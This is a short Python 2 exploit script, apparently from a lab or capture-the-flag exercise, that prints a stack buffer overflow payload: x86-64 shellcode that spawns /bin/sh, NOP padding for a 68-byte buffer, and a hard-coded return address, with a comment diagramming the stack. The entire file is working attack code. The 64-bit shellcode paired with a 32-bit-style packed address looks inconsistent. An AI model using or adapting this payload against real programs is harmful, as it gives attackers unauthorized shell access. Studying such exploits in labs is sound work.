#!/usr/bin/env python2

import struct
import sys

bufferSize = 68
execveShellcode = "\x48\x31\xd2\x48\x89\xd6\x52\x48\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xc0\x48\x83\xc0\x3b\x0f\x05"
padding = "\x90" * (bufferSize - len(execveShellcode))
shellcodeAddress = struct.pack("I", 0xbffff5cc)

# ----- STACK -----
# execveshellcode..
# .................
# padding..........
# .................
# shellcode address
# -----------------

sys.stdout.write(execveShellcode)
sys.stdout.write(padding)
sys.stdout.write(shellcodeAddress)


